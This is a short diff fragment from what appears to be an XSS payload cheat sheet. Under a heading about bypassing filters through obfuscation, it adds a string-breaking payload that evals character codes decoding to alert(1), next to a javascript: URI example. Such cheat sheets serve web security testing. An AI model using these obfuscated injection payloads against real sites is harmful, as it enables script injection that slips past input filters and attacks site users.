@@ -65,6 +65,10 @@ javascript:void(alert(1))
 
 
 🔐 Bypass Filters Using Arithmetic and Obfuscation
+
+
+";eval(String.fromCharCode(97,108,101,114,116,40,49,41))// 
 js
 Copy
 Edit
+
